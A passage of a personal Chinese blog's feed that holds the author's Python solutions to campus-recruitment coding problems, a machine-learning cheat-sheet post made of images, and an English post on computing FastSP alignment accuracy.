id="分析-v11">分析</h2><p>字符串中存在某种子序列，做法大致相同。</p><h1>矩阵的递增序列</h1><blockquote>  <p>Input: <code>n × n</code>矩阵。</p></blockquote><blockquote>  <p>Output: 最长递增序列的长度</p></blockquote><h2 id="代码-v20">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>      </td>      <td class="code">        <pre><span class="line">n = int(input())</span><br><span class="line">matrix = [[0 for i in range(n)] for j in range(n)]</span><br><span class="line">for i in range(n):</span><br><span class="line">    line = input().strip().split(&apos; &apos;)</span><br><span class="line">    for j in range(n):</span><br><span class="line">        matrix[i][j] = int(line[j])</span><br><span class="line">dfs = [[0 for i in range(n)] for j in range(n)]</span><br><span class="line">x_d = [0, 0, 1, -1]</span><br><span class="line">y_d = [1, -1, 0, 0]</span><br><span class="line">def DFS(x, y, dfs):</span><br><span class="line">    if dfs[x][y] != 0:</span><br><span class="line">        return dfs[x][y]</span><br><span class="line">    for i in range(len(x_d)):</span><br><span class="line">        new_x = x + x_d[i]</span><br><span class="line">        new_y = y + y_d[i]</span><br><span class="line">        if new_x &gt;= 0 and new_y &gt;= 0 and new_x &lt; n and new_y &lt; n:</span><br><span class="line">            if matrix[new_x][new_y] &gt; matrix[x][y]:</span><br><span class="line">                dfs[x][y] = max(DFS(new_x, new_y, dfs) + 1, dfs[x][y])</span><br><span class="line">            else:</span><br><span class="line">                dfs[x][y] = max(1, dfs[x][y])</span><br><span class="line">    return dfs[x][y]</span><br><span class="line">for i in range(n):</span><br><span class="line">    for j in range(n):</span><br><span class="line">        dfs[i][j] = DFS(i, j, dfs)</span><br><span class="line">print(max(max(dfs)))</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析-v12">分析</h2><p>一个很明显的思路就是从某点出发，DFS查找最长的递增路径，但是考虑到某些节点可能在之前已经遍历过，可以使用其保存的信息。</p><h1>不重叠区间</h1><blockquote>  <p>Input: n个不同区间。</p></blockquote><blockquote>  <p>Output: 去掉多少区间之后，剩下的区间构成不重叠区间。</p></blockquote><h2 id="代码-v21">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line">interval_list = []</span><br><span class="line">n = int(input())</span><br><span class="line">for i in range(n):</span><br><span class="line">    line = input().strip().split(&apos; &apos;)</span><br><span class="line">    interval_list.append([int(line[0]), int(line[1])])</span><br><span class="line">interval_list = sorted(interval_list, key = lambda item:item[1])</span><br><span class="line">dp = [1 for i in range(n)]</span><br><span class="line">for i in range(n):</span><br><span class="line">    for j in range(i - 1, -1, -1):</span><br><span class="line">        if interval_list[i][0] &gt;= interval_list[j][1]:</span><br><span class="line">            dp[i] = max(dp[j] + 1, dp[i])</span><br><span class="line">        else:</span><br><span class="line">            dp[i] = max(dp[i], dp[j])</span><br><span class="line">print(n - dp[-1])</span><br></pre>      </td>    </tr>  </table></figure><h1>机器人行走</h1><blockquote>  <p>Input: 有t组测试，每一组机器人从(0, 0)位置朝向向上，向右为x轴正方向，向下为y轴正方向，指令有：向左转(L)，向右转®，前进N步或者到头(G N)以及打印当前位置§。</p></blockquote><blockquote>  <p>Output: 打印每个Case的编号以及执行P指令之后的输出。</p></blockquote><h2 id="代码-v22">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre>      </td>      <td class="code">        <pre><span class="line">t = int(input())</span><br><span class="line">cur_x = 0</span><br><span class="line">cur_y = 0</span><br><span class="line">cur_t = 1</span><br><span class="line">Turns = [&apos;L&apos;, &apos;U&apos;, &apos;R&apos;, &apos;D&apos;]</span><br><span class="line">step_x = [0, -1, 0, 1]</span><br><span class="line">step_y = [-1, 0, 1, 0]</span><br><span class="line">def Turn(cur_t, turn):</span><br><span class="line">    if turn == &apos;R&apos;:</span><br><span class="line">        cur_t += 1 % len(Turns)</span><br><span class="line">    else:</span><br><span class="line">        cur_t -= 1 % len(Turns)</span><br><span class="line">    return cur_t  </span><br><span class="line">def Walk(cur_x, cur_y, cur_t, step, n):</span><br><span class="line">    if cur_x + step * step_x[cur_t] &gt;= 0 and cur_x + step * step_x[cur_t] &lt; n and cur_y + step * step_y[cur_t] &gt;= 0 and cur_y + step * step_y[cur_t] &lt; n:</span><br><span class="line">        return cur_x + step * step_x[cur_t], cur_y + step * step_y[cur_t]</span><br><span class="line">    elif cur_x + step * step_x[cur_t] &lt; 0:</span><br><span class="line">        cur_x = 0</span><br><span class="line">    elif cur_y + step * step_y[cur_t] &lt; 0:</span><br><span class="line">        cur_x = 0</span><br><span class="line">    elif cur_x + step * step_x[cur_t] &gt;= n:</span><br><span class="line">        cur_x = n - 1</span><br><span class="line">    elif cur_y + step * step_y[cur_t] &gt;= n:</span><br><span class="line">        cur_y = n - 1   </span><br><span class="line">    return cur_x, cur_y</span><br><span class="line">ret = &apos;&apos;  </span><br><span class="line">for times in range(t):</span><br><span class="line">    ret += &apos;Case #&apos; + str(times + 1) + &apos;:\n&apos;</span><br><span class="line">    n_m = input().strip().split(&apos; &apos;)</span><br><span class="line">    n = int(n_m[0])</span><br><span class="line">    m = int(n_m[1])</span><br><span class="line">    cur_x = 0</span><br><span class="line">    cur_y = 0</span><br><span class="line">    cur_t = 1</span><br><span class="line">    for i in range(m):</span><br><span class="line">        line = input().strip().split(&apos; &apos;)</span><br><span class="line">        if line[0] == &apos;L&apos; or line[0] == &apos;R&apos;:</span><br><span class="line">            cur_t = Turn(cur_t, line[0])</span><br><span class="line">        elif line[0] == &apos;G&apos;:</span><br><span class="line">            cur_x, cur_y = Walk(cur_x, cur_y, cur_t, int(line[1]), n)</span><br><span class="line">        elif line[0] == &apos;P&apos;:</span><br><span class="line">            ret += str(cur_y) + &apos; &apos; + str(cur_x) + &apos;\n&apos;</span><br><span class="line">print(ret)</span><br></pre>      </td>    </tr>  </table></figure><h1>将0/1表示的字符串根据莫斯密码转化成字符串</h1><blockquote>  <p>以‘1’表示摩斯密码中的‘·’，以‘111’表示摩斯密码中的‘-’。 以‘0’表示莫斯密码中的分割。 以‘000’表示不同字符摩斯密码的分割。 以‘0000000’表示不同单词的分割。  </p></blockquote><blockquote>  <p>Input: 以0/1表示的字符串</p></blockquote><blockquote>  <p>Output: 转化后的字符串</p></blockquote><h2 id="代码-v23">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre>      </td>      <td class="code">        <pre><span class="line">line = input().strip()</span><br><span class="line">ret = &apos;&apos;</span><br><span class="line">last = 0</span><br><span class="line">letter = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&apos;</span><br><span class="line">ms = [&apos;01&apos;, &apos;1000&apos;, &apos;1010&apos;, &apos;100&apos;, &apos;0&apos;, &apos;0010&apos;, &apos;110&apos;, &apos;0000&apos;, &apos;00&apos;, &apos;0111&apos;, &apos;101&apos;, &apos;0100&apos;, &apos;11&apos;, &apos;10&apos;, &apos;111&apos;, &apos;0110&apos;, &apos;1101&apos;, &apos;010&apos;, &apos;000&apos;, &apos;1&apos;, &apos;001&apos;, &apos;0001&apos;, &apos;011&apos;, &apos;1001&apos;, &apos;1011&apos;, &apos;1100&apos;, &apos;01111&apos;, &apos;00111&apos;, &apos;00011&apos;, &apos;00001&apos;, &apos;0000&apos;, &apos;10000&apos;, &apos;11000&apos;, &apos;11100&apos;, &apos;11110&apos;, &apos;11111&apos;]</span><br><span class="line">def DealC(line):</span><br><span class="line">    chr = &apos;&apos;</span><br><span class="line">    for i in line.split(&apos;0&apos;):</span><br><span class="line">        if i == &apos;1&apos;:</span><br><span class="line">            chr += &apos;0&apos;</span><br><span class="line">        else:</span><br><span class="line">            chr += &apos;1&apos;</span><br><span class="line">    for i in range(len(ms)):</span><br><span class="line">        if ms[i] == chr:</span><br><span class="line">            return letter[i]</span><br><span class="line">def DealL(line):</span><br><span class="line">    ret = &apos;&apos;</span><br><span class="line">    lst = 0</span><br><span class="line">    for i in range(len(line) - 3):</span><br><span class="line">        if line[i: i + 3] == &apos;000&apos;:</span><br><span class="line">            ret += str(DealC(line[lst: i]))</span><br><span class="line">            lst = i + 3</span><br><span class="line">    ret += str(DealC(line[lst:]))</span><br><span class="line">    return ret</span><br><span class="line">for i in range(len(line) - 7):</span><br><span class="line">    if line[i:i + 7] == &apos;0000000&apos;:</span><br><span class="line">        ret += str(DealL(line[last: i])) + &apos; &apos;</span><br><span class="line">        last = i + 7</span><br><span class="line">ret += str(DealL(line[last:]))</span><br><span class="line">print(ret)</span><br></pre>      </td>    </tr>  </table></figure><h1>数n中各位数字全排列能整除数m的个数</h1><blockquote>  <p>Input: 两个数字n和m。</p></blockquote><blockquote>  <p>Output: 数n中各位数字全排列能整除数m的个数。</p></blockquote><h2 id="代码-v24">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre>      </td>      <td class="code">        <pre><span class="line">line = input().split(&apos; &apos;)</span><br><span class="line">n = int(line[0])</span><br><span class="line">m = int(line[1])</span><br><span class="line">num_list = [0 for i in range(10)]</span><br><span class="line">lens = 0</span><br><span class="line">while n &gt; 0:</span><br><span class="line">    num_list[n % 10] += 1</span><br><span class="line">    n //= 10</span><br><span class="line">    lens += 1</span><br><span class="line">ret = 0    </span><br><span class="line">def IN(num, num_list):</span><br><span class="line">    tmp_num_list = [0 for i in range(10)]</span><br><span class="line">    while num &gt; 0:</span><br><span class="line">        tmp_num_list[num % 10] += 1</span><br><span class="line">        num //= 10</span><br><span class="line">    if tmp_num_list[0] &lt;= num_list[0]:</span><br><span class="line">        for i in range(1, 10):</span><br><span class="line">            if tmp_num_list[i] != num_list[i]:</span><br><span class="line">                return False</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line">for i in range(1, int(pow(10, lens) / m)):</span><br><span class="line">    if IN(m * i, num_list):</span><br><span class="line">        print(m * i)</span><br><span class="line">        ret += 1</span><br><span class="line">print(ret)</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析-v13">分析</h2><p>我的思路是通过逆向观察m倍数需要的那些数字是否都在n里面来判断n的各位全排列能否得到m的倍数。当然，如果n中0的个数大于m的倍数中0的个数是不影响的。</p><h1>最长回文子串</h1><blockquote>  <p>Input: 字符串</p></blockquote><blockquote>  <p>Output: 最长回文子串</p></blockquote><h2 id="代码-v25">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>      </td>      <td class="code">        <pre><span class="line">line = input().strip()</span><br><span class="line">dp = [0] * len(line)</span><br><span class="line">for i in range(1, len(line)):</span><br><span class="line">    if line[i] == line[i - dp[i - 1] - 1] and i - dp[i - 1] - 1 &gt;= 0:</span><br><span class="line">        dp[i] = dp[i - 1] + 2</span><br><span class="line">    elif line[i] == line[i - 2] and dp[i - 1] == 0:</span><br><span class="line">        dp[i] = 3</span><br><span class="line">    else:</span><br><span class="line">        dp[i] = 0</span><br><span class="line"></span><br><span class="line">for i in range(len(dp)):</span><br><span class="line">    if max(dp) == dp[i]:</span><br><span class="line">        print(line[i + 1 - max(dp): i + 1])</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析-v14">分析</h2><p>简单的动态规划，但是要考虑两种情况：（1）回文串长度为偶数；（2）回文串长度为奇数即中间的字母不用回文。</p><h1>大鱼吃小鱼</h1><blockquote>  <p>Input: 长度为n的整数串</p></blockquote><blockquote>  <p>Output: 每次大鱼吃小鱼，可以同时进行，输出大鱼吃小鱼的次数。</p></blockquote><h2 id="代码-v26">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre>      </td>      <td class="code">        <pre><span class="line">n = int(input())</span><br><span class="line">line = input().split(&apos; &apos;)</span><br><span class="line">int_list = [int(line[i]) for i in range(len(line))]</span><br><span class="line">live = [1] * len(int_list)</span><br><span class="line">left = len(int_list)</span><br><span class="line">new_left = 65535</span><br><span class="line">ret = -1</span><br><span class="line">while left &lt; new_left:</span><br><span class="line">    new_left = left</span><br><span class="line">    key = int_list[0]</span><br><span class="line">    for i in range(1, len(int_list)):</span><br><span class="line">        new_k = int_list[i]</span><br><span class="line">        if key &gt; int_list[i]:</span><br><span class="line">            int_list[i] = -1</span><br><span class="line">        key = new_k</span><br><span class="line">    ret += 1</span><br><span class="line">    for i in range(len(int_list)- 1, -1, -1):</span><br><span class="line">        if int_list[i] == -1:</span><br><span class="line">            int_list.pop(i)</span><br><span class="line">    left = len(int_list)</span><br><span class="line">print(ret)</span><br></pre>      </td>    </tr>  </table></figure><h1>非递归版二叉树深度</h1><h2 id="代码-v27">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre>      </td>      <td class="code">        <pre><span class="line">num =int(input())</span><br><span class="line">class TreeNode:</span><br><span class="line">    def __init__(self, val = None, left = None,right = None):</span><br><span class="line">        self.val = val</span><br><span class="line">        self.left = left</span><br><span class="line">        self.right = right</span><br><span class="line">def Depth(root):</span><br><span class="line">    if root == None:</span><br><span class="line">        return 0</span><br><span class="line">    else:</span><br><span class="line">        queue = []</span><br><span class="line">        depth = 0</span><br><span class="line">        queue.append(root)</span><br><span class="line">        while len(queue):</span><br><span class="line">            depth += 1</span><br><span class="line">            cur = len(queue)</span><br><span class="line">            tmp = 0</span><br><span class="line">            while(tmp &lt; cur):</span><br><span class="line">                tmp += 1</span><br><span class="line">                node = queue.pop(0)</span><br><span class="line">                if node.left != None:</span><br><span class="line">                    queue.append(node.left)</span><br><span class="line">                if node.right != None:</span><br><span class="line">                    queue.append(node.right)</span><br><span class="line">        return depth</span><br><span class="line">treenode = [None for i in range(num)]</span><br><span class="line">for i in range(num):</span><br><span class="line">    treenode[i] = TreeNode(i)</span><br><span class="line">for i in range(num):</span><br><span class="line">    if i * 2 + 1 &lt; num:</span><br><span class="line">        treenode[i].left = treenode[i * 2 + 1]</span><br><span class="line">    if i * 2 + 2 &lt; num:</span><br><span class="line">        treenode[i].right = treenode[i * 2 + 2]</span><br><span class="line">print(Depth(treenode[0]))</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析-v15">分析</h2><p>二叉树深度就是二叉树层数，所以可以使用层序遍历二叉树实现。</p><h1>数组中出现超过一半的数字</h1><h2 id="代码-v28">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line">def majorityElement(nums: List[int]) -&gt; int:</span><br><span class="line">        dp = [0] * len(nums)</span><br><span class="line">        dp[0] = 1</span><br><span class="line">        votes = nums[0]</span><br><span class="line">        for i in range(1, len(nums)):</span><br><span class="line">            if dp[i - 1] == 0:</span><br><span class="line">                votes = nums[i]</span><br><span class="line">                dp[i] = 1</span><br><span class="line">                continue</span><br><span class="line">            if votes == nums[i]:</span><br><span class="line">                dp[i] = dp[i - 1] + 1</span><br><span class="line">            else:</span><br><span class="line">                dp[i] = dp[i - 1] - 1</span><br><span class="line">        return votes</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析-v16">分析</h2><p>每一步设定当前值为“大于一半的数”并将此时的值记为“+1”，往后遇到不同的值在该值上“-1”，遇到值为0，则将前面的序列舍弃，重新开始计数。最终在序列扫描一遍之后的假设“大于一半的数”的值即为最终结果。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/fdc308a8/">http://home.meng.uno/articles/fdc308a8/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      2021届秋招正如火如荼地进行着，截止目前，我已经参加了绝大部分互联网企业的秋招，我想将自己写过的代码保存一下，供以后再来回味。 代码基本都是用Python写的，有些并没有100%AC。 

不匹配括号数量
Input: 包含若干(, ), [, ]的字符串。

Output: 不能配对的括号的数量。

代码
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22


def BracketsMatch(text, flag):
    arr = []
    if flag == 1:
        left = &#39;(&#39;
    
    
    </summary>
    
      <category term="Code" scheme="http://home.meng.uno/categories/Code/"/>
    
    
      <category term="2021秋招" scheme="http://home.meng.uno/tags/2021%E7%A7%8B%E6%8B%9B/"/>
    
      <category term="算法工程师" scheme="http://home.meng.uno/tags/%E7%AE%97%E6%B3%95%E5%B7%A5%E7%A8%8B%E5%B8%88/"/>
    
      <category term="AI工程师" scheme="http://home.meng.uno/tags/AI%E5%B7%A5%E7%A8%8B%E5%B8%88/"/>
    
      <category term="算法" scheme="http://home.meng.uno/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="编程" scheme="http://home.meng.uno/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>机器学习&amp;深度学习速查表</title>
    <link href="http://home.meng.uno/articles/5b828fc2/"/>
    <id>http://home.meng.uno/articles/5b828fc2/</id>
    <published>2019-04-10T06:36:02.000Z</published>
    <updated>2020-12-02T01:42:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础">基础</h2><h3 id="神经网络">神经网络</h3><p><img src="http://www.meng.uno/images/code/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.png" alt="神经网络">  <img src="http://www.meng.uno/images/code/%E7%BD%91%E7%BB%9C.png" alt="网络"></p><h3 id="线性代数">线性代数</h3><p><img src="http://www.meng.uno/images/code/liner.png" alt="linear"></p><h3 id="python基础">Python基础</h3><p><img src="http://www.meng.uno/images/code/sci.png" alt="sci"></p><h3 id="scipy科学计算">scipy科学计算</h3><p><img src="http://www.meng.uno/images/code/scipy.png" alt="scipy"></p><h3 id="spark">Spark</h3><p><img src="http://www.meng.uno/images/code/spark.jpeg" alt="spark"></p><h2 id="数据保存及可视化">数据保存及可视化</h2><h3 id="numpy">numpy</h3><p><img src="http://www.meng.uno/images/code/np.png" alt="np"></p><h3 id="pandas">pandas</h3><p><img src="http://www.meng.uno/images/code/pd.png" alt="pd"></p><h3 id="bokeh">bokeh</h3><p><img src="http://www.meng.uno/images/code/bokeh.png" alt="bokeh"></p><h2 id="画图">画图</h2><h3 id="matplotlib">matplotlib</h3><p><img src="http://www.meng.uno/images/code/matplot.png" alt="matplot"></p><h3 id="ggplot">ggplot</h3><p><img src="http://www.meng.uno/images/code/datavis.jpeg" alt="data vis">  <img src="http://www.meng.uno/images/code/gg.jpeg" alt="ggplot"></p><h2 id="机器学习">机器学习</h2><h3 id="sk-learn">sk-learn</h3><p><img src="http://www.meng.uno/images/code/sk.png" alt="sk">  <img src="http://www.meng.uno/images/code/scikit.png" alt="scikit"></p><h3 id="keras">Keras</h3><p><img src="http://www.meng.uno/images/code/keras.jpeg" alt="keras"></p><h3 id="tensorflow">TensorFlow</h3><p><img src="http://www.meng.uno/images/code/TF.png" alt="TF"></p><h2 id="算法">算法</h2><h3 id="数据结构">数据结构</h3><p><img src="http://www.meng.uno/images/code/datastruct.png" alt="datastruct"></p><h3 id="复杂度">复杂度</h3><p><img src="http://www.meng.uno/images/code/O().png" alt="O()"></p><h3 id="排序算法">排序算法</h3><p><img src="http://www.meng.uno/images/code/sort.png" alt="sort"></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/5b828fc2/">http://home.meng.uno/articles/5b828fc2/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      基础
神经网络
 

线性代数


Python基础


scipy科学计算


Spark


数据保存及可视化
numpy


pandas


bokeh


画图
matplotlib


ggplot
 

机器学习
sk-learn
 

Keras


TensorFlow


算法
数据结构


复杂度


排序算法




本文链接： http://home.meng.uno/articles/5b828fc2/ 欢迎转载！
    
    </summary>
    
      <category term="Deep Learning" scheme="http://home.meng.uno/categories/Deep-Learning/"/>
    
    
      <category term="Deep Learning" scheme="http://home.meng.uno/tags/Deep-Learning/"/>
    
      <category term="Machine Learning" scheme="http://home.meng.uno/tags/Machine-Learning/"/>
    
      <category term="Python" scheme="http://home.meng.uno/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>FastSP: linear time calculation of alignment accuracy</title>
    <link href="http://home.meng.uno/articles/bd4539a2/"/>
    <id>http://home.meng.uno/articles/bd4539a2/</id>
    <published>2018-10-27T12:31:08.000Z</published>
    <updated>2020-12-02T01:46:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1>A General Observation</h1><p><img src="http://www.meng.uno/images/fastsp/1.jpg" alt="Observation"></p><p>From the result, we could see that:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">SP-Score: 19/26 = 0.7307…</span><br><span class="line">Modeler: 19/27 = 0.7037…</span><br><span class="line">SP-FN: (26 - 19)/26 = 0.2692….</span><br><span class="line">SP-FP: (27 - 19)/27 = 0.2962….</span><br><span class="line">TC: 3/8 = 0.375</span><br></pre>      </td>    </tr>  </table></figure><h1>Approach</h1><p>From the last section, we know our propose is to calculate:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">1. Number of shared homologies.</span><br><span class="line">2. Number of homologies in the reference alignment.</span><br><span class="line">3. Number of homologies in the estimated alignment.</span><br><span class="line">4. Number of correctly aligned columns.</span><br><span class="line">5. Number of aligned columns in the reference alignment.</span><br></pre>      </td>    </tr>  </table></figure><p>At the same time, we have a general thinking which is:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">2,3 —&gt; 1</span><br><span class="line">5 is the easiest</span><br><span class="line">1 — &gt; 4</span><br></pre>      </td>    </tr>  </table></figure><p>First of all, it gives these definitions:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Si represent the i-th sequence in the alignment.</span><br><span class="line">Ai represent the i-th alignment.</span><br><span class="line">Ni,j represent the j-th site in Si.</span><br></pre>      </td>    </tr>  </table></figure><p>I will give you an example:</p><p><img src="http://www.meng.uno/images/fastsp/2.jpg" alt="Example"></p><p>Then, we could know these (Explaining an example):</p><p><img src="http://www.meng.uno/images/fastsp/3.jpg" alt="Approach"></p><h1>Algorithm</h1><p>This section is for programming.</p><p>Let’s look at some difinitions first:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line">n represent the number of sequences in the alignment.</span><br><span class="line">k represent the biggest length of sequences in the alignment.</span><br><span class="line">S[i,j] represent a n•k matrix which equals (a, b) means Ni,j appears in site a for the reference alignment and in site b for the estimated alignment.</span><br><span class="line">bx represent the number of non-gapped entries in the x-th site.</span><br><span class="line">mi represent the number of elements in the i-th equivalence class.</span><br><span class="line">Nx represent the number of homologies in the estimated alignment that are shared with the x-th site in the reference alignment.   </span><br><span class="line">hi represent the number of homologous pairs in alignment Ai.</span><br></pre>      </td>    </tr>  </table></figure><p>Explaining them by this example:</p><p><img src="http://www.meng.uno/images/fastsp/4.jpg" alt="Example"></p><p>The pseudo code is like this:</p><p><img src="http://www.meng.uno/images/fastsp/5.jpg" alt="Pseudo Code"></p><p>Make a mapping:</p><p><img src="http://www.meng.uno/images/fastsp/6.jpg" alt="Mapping"></p><p>The result could be:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">SP-Score: N/h1</span><br><span class="line">Modeler: N/h2</span><br><span class="line">TC: cor_num/k</span><br></pre>      </td>    </tr>  </table></figure><h1>Evaluation</h1><p>Calculating the matrix S: <code>O(nk)</code></p><p>Calculating combination number: <code>O(1)</code></p><p>Calculating each Nx: <code>O(n)</code></p><p>As for the FOR loop: <code>O(nk)</code></p><p><strong>So:</strong></p><p>The time complexity is <code>O(n•k)</code>.</p><p>The space complexity is <code>O(n•k)</code>.</p><p>Comparing to the other programs:</p><p><img src="http://www.meng.uno/images/fastsp/7.jpg" alt="evaluation"></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/bd4539a2/">http://home.meng.uno/articles/bd4539a2/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      A General Observation


From the result, we could see that:

1
2
3
4
5


SP-Score: 19/26 = 0.7307…
Modeler: 19/27 = 0.7037…
SP-FN: (26 - 19)/26 = 0.2692….
SP-FP: (27 - 19)/27 = 0.2962….
TC: 3/8 = 0.375


Approach
From the last section, we know our propose is to calculate:

1
2
3
4
5


1. Number of s
    
    </summary>
    
      <category term="Bioinformatics" scheme="http://home.meng.uno/categories/Bioinformatics/"/>
    
    
      <category term="MSA" scheme="http://home.meng.uno/tags/MSA/"/>
    
